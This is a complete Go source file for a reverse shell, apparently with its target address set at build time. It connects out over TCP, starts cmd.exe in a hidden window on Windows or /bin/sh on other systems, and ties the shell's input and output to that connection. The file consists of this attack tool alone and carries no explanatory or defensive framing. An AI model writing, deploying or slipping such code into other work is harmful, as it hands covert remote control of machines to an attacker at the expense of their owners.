package main

import (
	"net"
	"os"
	"os/exec"
	"runtime"
	"syscall"
)

var ip string

func main() {
	if len(ip) == 0{
		os.Exit(1)
	}
	cnn, err := net.Dial("tcp", ip)
	if err != nil {
		cnn.Close()
		os.Exit(1)
	}

	var ccc *exec.Cmd
	switch runtime.GOOS{
	case "windows":
		ccc = exec.Command("C:\\Windows\\system32\\cmd.exe")
		ccc.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	default:
		ccc = exec.Command("/bin/sh")
	}

	ccc.Stdin = cnn
	ccc.Stdout = cnn
	ccc.Stderr = cnn

	ccc.Run()
}
